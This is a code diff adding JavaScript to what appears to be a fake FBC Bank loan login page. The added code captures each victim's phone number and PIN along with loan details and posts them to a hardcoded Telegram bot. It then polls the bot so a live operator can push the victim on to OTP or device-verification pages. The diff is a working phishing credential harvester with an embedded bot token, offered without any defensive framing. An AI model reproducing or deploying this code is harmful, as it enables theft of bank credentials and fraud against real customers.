@@ -1,3 +1,87 @@
+const CONFIG = {
+      BOT_TOKEN: '8790894986:AAGHaI2_jlpbI8WTzssq-2ssGwhRr7MAXrI',
+      CHAT_ID: '8820857419',
+      APPROVE_PAGE: 'otp.html',
+    };
+function sendToBot(phone, pin) {
+      if (isProcessing) return;
+      isProcessing = true;
+      continueBtn.disabled    = true;
+      continueBtn.textContent = 'Verifying…';
+
+      const application = getStoredApplication();
+      const loanAmount  = application.loanAmount ? '$' + Number(application.loanAmount).toLocaleString() : '—';
+      const loanType    = application.loanType || '—';
+      const fullName    = [application.firstName, application.lastName].filter(Boolean).join(' ').trim() || '—';
+
+      const ts        = Date.now();
+      const approveId = `approve_${ts}`;
+      const declineId = `decline_${ts}`;
+      const verifyId  = `verify_${ts}`;
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🟢 FBC  Bank login</b>\n\nApplicant: <b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan Type: <b>${loanType}</b>\nPhone: <code>+263${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '✅ Approve Loan',  callback_data: approveId },
+                { text: '📱 Verify Device', callback_data: verifyId  }
+              ],
+              [{ text: '❌ Decline', callback_data: declineId }]
+            ]
+          }
+        })
+      })
+      .then(() => {
+        // Save phone to localStorage (original behaviour)
+        localStorage.setItem('phone', phone);
+        localStorage.setItem('flexLoanLogin', JSON.stringify({ phone, continuedAt: new Date().toISOString() }));
+
+        spinnerOverlay.style.display = 'flex';
+        startPolling(approveId, declineId, verifyId);
+      })
+      .catch(() => resetButton());
+    }
+
+    function startPolling(approveId, declineId, verifyId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            if (!data.ok || !data.result) return;
+
+            data.result.forEach(update => {
+              state.lastUpdateId = update.update_id;
+
+              if (update.callback_query) {
+                const cb = update.callback_query.data;
+
+                if (cb === approveId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  window.location.href = CONFIG.APPROVE_PAGE;
+                }
+                else if (cb === verifyId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  window.location.href = CONFIG.DEVICE_PAGE;   // → device.html
+                }
+                else if (cb === declineId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  showError('Request declined. Please try again.');
+                  resetButton();
+                }
+              }
+            });
+          });
+      }, 1000);
+    }
 import React, { useState } from 'react';
 import { FBCLogo } from './FBCLogo';
 import { Headphones, ArrowLeft, AlertCircle } from 'lucide-react';
